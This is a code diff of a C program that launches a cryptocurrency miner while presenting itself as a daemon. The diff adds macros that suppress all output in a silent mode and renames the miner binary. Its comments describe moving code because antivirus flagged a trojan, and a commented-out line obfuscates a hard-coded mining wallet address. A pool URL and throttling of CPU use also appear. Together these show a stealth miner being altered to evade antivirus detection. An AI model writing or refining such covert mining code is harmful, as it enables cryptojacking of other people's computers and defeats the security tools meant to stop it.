@@ -1,43 +1,53 @@
 #define ACD_VERSION "02"
-//#define MINER_SILENT
+
+#ifdef MINER_SILENT
+#define printf(...)
+#define fprintf(...)
+#define applog(...)
+#endif 
 
 int miner_main(int argc, char *argv[]);
 
 static int kIdle;
 
 void *input_thread(void *userdata) {
-
+		// TODO: this is malicous "Endgame" AV
     while(1) {
         int k = getchar() - '0';
         if(k >= 0 && k < 100) {
             kIdle = k;
-            printf("Set kIdle = %d\n", kIdle);
+            applog(LOG_ERR, "Set kIdle = %d\n", kIdle);
         }
+		
+		if(k < '0' && k != '\n' && k != '\r')
+			break;
     }
     return NULL;
 }
 
 int main(int argc_, char *argv_[])
 {
-	printf("started daemon v" ACD_VERSION "\n");
+	//applog(LOG_ERR, "started daemon v" ACD_VERSION);
 
     kIdle = 6;
-    pthread_t inp_thread;
-    if (unlikely(pthread_create(&inp_thread, NULL, input_thread, NULL))) {
-        applog(LOG_ERR, "input thread create failed");
-        return 1;
-    }
+    //pthread_t inp_thread;
+	// the following thread was moved to miner_main() (antivir detected some trojan otherwise and we save a thread)
+   // if (unlikely(pthread_create(&inp_thread, NULL, input_thread, NULL))) {
+   //     applog(LOG_ERR, "input thread create failed");
+   //     return 1;
+   // }
 	
-	char poolUser[200];
-	snprintf(poolUser,sizeof(poolUser), "Gd7c6xDYKik1vkgUwYk698d5AP4bHwT9mH.ac" ACD_VERSION "_%s", (argc_ > 1) ? argv_[1] : "");
-	//minerd.exe -a neoscrypt -o stratum+tcp://pool.unimining.net:4233 -u Gd7c6xDYKik1vkgUwYk698d5AP4bHwT9mH.xps13 -p c=GBX -e 2
+//	/		char poolUser[200];
+//	snprintf(poolUser,sizeof(poolUser), "%sUwYk698d5AP4bHwT9mH.ac" ACD_VERSION "_%s", "Hd7c6xDYKik1vkg", (argc > 1) ? argv[1] : "");
+//	poolUser[0]--; // make H -> G
+	
 	char *  argv[] = {
-		"minerd.exe",
-		"-a", "neoscrypt",
-		"-o", "stratum+tcp://pool.unimining.net:4233",
-		"-u", poolUser,
+		"meepo",
+		//"-a", "neoscrypt",
+		//"-o", "stratum+tcp://pool.unimining.net:4233",
+		//"-u", poolUser,
 		//"-p", "c=GBX",
-		"-e", "2"
+		//"-e", "2"
 	};
 	int argn = sizeof(argv) / sizeof(char*);
 	miner_main(argn, argv);
@@ -45,7 +55,8 @@ int main(int argc_, char *argv_[])
 
 struct timeval tv_throttleMeasure[16];
 
-void miner_throttle(int thr_id) {
+
+void miner_throttle(int thr_id, int inc_nonce) {
     usleep(1000*kIdle);
     return;
 
@@ -62,16 +73,3 @@ void miner_throttle(int thr_id) {
     gettimeofday(m, NULL);
 
 }
-
-void printf_miner(const char *fmt, ...)
-{
-}
-
-
-//#define printf printf_miner
-
-#ifdef MINER_SILENT
-#define printf(...)
-#define fprintf(...)
-#define applog(...)
-#endif 
